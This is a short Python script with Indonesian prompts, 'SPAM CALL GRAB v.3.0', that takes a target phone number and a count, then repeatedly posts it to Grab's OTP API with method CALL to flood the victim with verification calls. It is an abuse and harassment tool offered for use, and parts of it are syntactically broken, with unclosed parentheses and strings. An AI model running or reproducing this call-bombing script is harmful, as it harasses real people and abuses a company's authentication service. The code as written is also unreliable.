#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by Henrycko

try:
	import os, requests, time
except ModuleNotFoundError:
	print("\nSepertinya module requests belum di install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""
			SPAM CALL GRAB v.3.0
 ,_     _‚
 |\\\___//| Penyusun  : Henrycko
 |=6   6=|  Pendukung : Dzakira Alzena Daiva
 \=._Y_.=/  Gmail     : thetermuxchoice@gmail.com
  )  `  (    ,
 /       \  ((
 |       |   ))
/| |   | |\_//	MASUKAN NOMOR DENGAN "62" (EX: 62)
\| |._.| |/-’
 '"'   '"'
<NOTE> Github : https://github.com/Henrycko"""
print("[*] Klik ENTER Untuk Skip!"
no1 = input("[?] Nomor Target =>"
jlmh=int(input("%s[?] Jumlah spam =>"
dt={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}

try:
	print()
	print("[-] RESULT:"
	for i in range(jlmh):
		print("[!] PLEASE WAIT...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt)
		if str(idk) in str(r1.text):
			print("[+] Target1 Berhasil!")
		else:
			print("[-] Target1 Gagal!")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("Thank's Good bye!")
